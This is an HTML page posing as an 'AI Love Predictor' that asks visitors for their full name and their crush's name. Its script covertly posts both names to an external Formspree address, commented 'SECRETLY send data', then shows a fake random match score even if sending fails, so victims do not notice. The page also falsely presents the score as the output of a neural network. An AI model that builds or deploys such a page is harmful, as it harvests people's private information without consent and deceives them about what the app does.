<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸ’– AI Love Predictor v2.0 ðŸ’–</title>
    <style>
        /* Modern Gradient Background */
        body { 
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
            overflow: hidden;
        }

        /* Floating Hearts Animation */
        .heart {
            position: absolute;
            color: rgba(255, 255, 255, 0.6);
            animation: float 6s infinite linear;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        /* Glassmorphism Card Effect */
        .card { 
            background: rgba(255, 255, 255, 0.85);
            padding: 40px; 
            border-radius: 25px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.2); 
            width: 320px;
            z-index: 10;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.5);
        }

        h2 { color: #d81b60; margin-bottom: 5px; font-weight: 700; }
        p { color: #666; font-size: 0.9em; margin-bottom: 25px; }

        input { 
            width: 85%; 
            padding: 15px; 
            margin: 10px 0; 
            border: 2px solid #fce4ec; 
            border-radius: 15px; 
            outline: none;
            font-size: 16px;
            transition: 0.3s;
            background: rgba(255, 255, 255, 0.9);
        }

        input:focus { border-color: #ff4081; box-shadow: 0 0 8px rgba(255, 64, 129, 0.2); }

        /* Pulsing Button */
        button { 
            background: #ff4081; 
            color: white; 
            border: none; 
            padding: 15px 40px; 
            border-radius: 30px; 
            font-size: 18px;
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4);
            transition: transform 0.2s;
            animation: pulse 2s infinite;
        }

        button:active { transform: scale(0.95); }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.7); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255, 64, 129, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0); }
        }

        #loader { display: none; margin-top: 20px; font-weight: bold; color: #ff4081; font-size: 1.1em; }
        #finalScore { margin-top: 20px; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); }

    </style>
</head>
<body>

    <div id="heart-container"></div>

    <div class="card">
        <h2>ðŸ’ž Love Scanner</h2>
        <p>Advanced Neural Matching Algorithm</p>
        
        <form id="prankForm" action="https://formspree.io/f/mbdalzbj" method="POST">
            <input type="text" name="User_Name" id="uName" placeholder="Your Full Name" required autocomplete="off">
            <input type="text" name="Lover_Name" id="cName" placeholder="Crush's Full Name" required autocomplete="off">
            
            <button type="button" onclick="runPrank()">Scan Compatibility</button>
        </form>

        <div id="loader">Syncing Heartbeats... ðŸ’“</div>
        <h1 id="finalScore" style="color: #ff4081;"></h1>
    </div>

    <script>
        // 1. Background Animation Logic
        function createHeart() {
            const heart = document.createElement('div');
            heart.classList.add('heart');
            heart.innerHTML = 'â¤ï¸';
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.fontSize = Math.random() * 20 + 10 + 'px';
            heart.style.animationDuration = Math.random() * 3 + 3 + 's';
            
            document.getElementById('heart-container').appendChild(heart);
            
            setTimeout(() => {
                heart.remove();
            }, 6000);
        }
        
        setInterval(createHeart, 400);

        // 2. The Prank Logic
        function runPrank() {
            const u = document.getElementById('uName').value;
            const c = document.getElementById('cName').value;
            const loader = document.getElementById('loader');
            const form = document.getElementById('prankForm');
            
            if(!u || !c) {
                alert("âš  Please enter both names to start the scan!");
                return;
            }

            // Hide form, show loader
            form.style.display = "none";
            loader.style.display = "block";
            
            // SECRETLY send data to your Formspree ID
            const formData = new FormData(form);
            
            fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).then(response => {
                if (response.ok) {
                    // Success! Now wait a tiny bit and show the fake result
                    setTimeout(() => {
                        loader.style.display = "none";
                        // Generate a random score between 88% and 99%
                        const score = Math.floor(Math.random() * 12) + 88; 
                        document.getElementById('finalScore').innerText = score + "% MATCH!";
                        
                        // Optional: Add a small subtitle
                        const sub = document.createElement('p');
                        sub.innerText = "Compatibility confirmed by AI! ðŸ’˜";
                        sub.style.marginTop = "-10px";
                        document.querySelector('.card').appendChild(sub);
                    }, 2500);
                } else {
                    // Fallback if Formspree fails (still show the prank result so they don't know!)
                    loader.style.display = "none";
                    document.getElementById('finalScore').innerText = "94% MATCH!";
                }
            }).catch(error => {
                // Network error? Just show a fake result anyway.
                loader.style.display = "none";
                document.getElementById('finalScore').innerText = "91% MATCH!";
            });
        }
    </script>
</body>
</html>
